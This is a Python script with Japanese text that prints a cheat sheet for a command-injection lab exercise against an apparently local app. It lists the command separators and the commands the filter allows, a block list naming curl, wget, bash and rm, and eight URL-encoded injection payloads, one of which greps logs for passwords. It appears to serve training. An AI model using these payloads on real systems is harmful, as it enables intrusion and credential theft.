#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
制限付きコマンドインジェクション - 使用可能なコマンド一覧
"""

def display_usable_commands():
    print("🔧 制限付きコマンドインジェクション - 使用可能なコマンド")
    print("=" * 60)
    
    base_url = "http://localhost:5000/admin/system?target="
    
    print("\n📋 基本的な攻撃構文:")
    print("-" * 40)
    syntax_examples = [
        "IPアドレス & コマンド",
        "IPアドレス; コマンド", 
        "IPアドレス && コマンド",
        "IPアドレス | コマンド"
    ]
    
    for syntax in syntax_examples:
        print(f"• {syntax}")
    
    print("\n✅ 使用可能なコマンド一覧:")
    print("=" * 50)
    
    command_categories = {
        "📁 ディレクトリ・ファイル操作": [
            ("dir", "ディレクトリ一覧表示 (Windows)"),
            ("ls", "ディレクトリ一覧表示 (Linux/macOS)"),
            ("ls -la", "詳細なファイル一覧"),
            ("pwd", "現在のディレクトリパス"),
            ("cat filename", "ファイル内容表示"),
            ("head filename", "ファイルの先頭表示"),
            ("tail filename", "ファイルの末尾表示"),
            ("find /path -name pattern", "ファイル検索"),
            ("locate filename", "ファイル位置検索"),
            ("wc filename", "行数・文字数カウント")
        ],
        
        "👤 ユーザー・システム情報": [
            ("whoami", "現在のユーザー名"),
            ("id", "ユーザーID情報 (Linux/macOS)"),
            ("hostname", "ホスト名表示"),
            ("uname -a", "システム詳細情報 (Linux/macOS)"),
            ("systeminfo", "システム情報 (Windows)"),
            ("ver", "OSバージョン (Windows)"),
            ("date", "現在の日時"),
            ("time", "現在の時刻")
        ],
        
        "🔍 プロセス・システム監視": [
            ("ps", "プロセス一覧 (Linux/macOS)"),
            ("ps aux", "詳細なプロセス一覧"),
            ("top", "リアルタイムプロセス監視"),
            ("ps -ef | grep process", "特定プロセス検索")
        ],
        
        "🌐 ネットワーク診断": [
            ("ping host", "Ping テスト"),
            ("tracert host", "経路追跡 (Windows)"),
            ("traceroute host", "経路追跡 (Linux/macOS)"),
            ("nslookup domain", "DNS検索")
        ],
        
        "🔎 テキスト検索・処理": [
            ("grep pattern file", "文字列検索"),
            ("grep -r pattern dir", "再帰的文字列検索"),
            ("echo text", "文字列出力"),
            ("which command", "コマンドパス検索 (Linux/macOS)"),
            ("where command", "コマンドパス検索 (Windows)"),
            ("type command", "コマンド情報表示")
        ]
    }
    
    for category, commands in command_categories.items():
        print(f"\n{category}")
        print("-" * 30)
        for i, (cmd, desc) in enumerate(commands, 1):
            print(f"{i:2d}. {cmd:<20} - {desc}")
    
    print("\n🎯 実際の攻撃例:")
    print("=" * 50)
    
    attack_examples = [
        ("127.0.0.1 & dir", "ローカルディレクトリ一覧"),
        ("google.com; whoami", "ユーザー名取得"),
        ("8.8.8.8 && systeminfo", "システム情報取得"),
        ("localhost | ps aux", "プロセス一覧表示"),
        ("github.com & cat /etc/hostname", "ホスト名取得"),
        ("example.com; find /tmp -name '*.log'", "ログファイル検索"),
        ("127.0.0.1 && grep -r 'password' /var/log", "パスワード検索"),
        ("target.com | uname -a && id", "複数コマンド実行")
    ]
    
    print("📝 攻撃ペイロード例:")
    for i, (payload, desc) in enumerate(attack_examples, 1):
        print(f"\n{i}. {desc}")
        print(f"   ペイロード: {payload}")
        
        # URLエンコード
        import urllib.parse
        encoded = urllib.parse.quote(payload)
        print(f"   URL: {base_url}{encoded}")
    
    print("\n❌ 使用できないコマンド (ブロック済み):")
    print("=" * 50)
    
    blocked_commands = [
        "rm, del - ファイル削除",
        "python, node, php - スクリプト実行",
        "curl, wget - 外部通信",
        "bash, sh, cmd - シェル実行", 
        "kill, killall - プロセス停止",
        "shutdown, reboot - システム制御",
        "chmod, chown - 権限変更",
        "mount, umount - ファイルシステム",
        "net, netsh - ネットワーク設定",
        "powershell - PowerShell実行"
    ]
    
    for cmd in blocked_commands:
        print(f"• {cmd}")
    
    print("\n💡 効果的な情報収集の流れ:")
    print("=" * 50)
    workflow = [
        "1. 基本情報収集: whoami, hostname, pwd",
        "2. システム調査: systeminfo/uname, ps",
        "3. ファイル探索: find, ls, cat",
        "4. ログ分析: grep, tail",
        "5. ネットワーク: ping, nslookup"
    ]
    
    for step in workflow:
        print(step)
    
    print("\n🎓 学習ポイント:")
    print("=" * 50)
    learning_points = [
        "✅ コマンドセパレータの理解 (&, ;, &&, |)",
        "✅ OS別コマンドの違い (Windows vs Linux)",
        "✅ 情報収集の段階的アプローチ",
        "✅ ホワイトリスト方式の対策効果",
        "✅ SSRF + Command Injection の組み合わせ"
    ]
    
    for point in learning_points:
        print(point)

if __name__ == "__main__":
    display_usable_commands()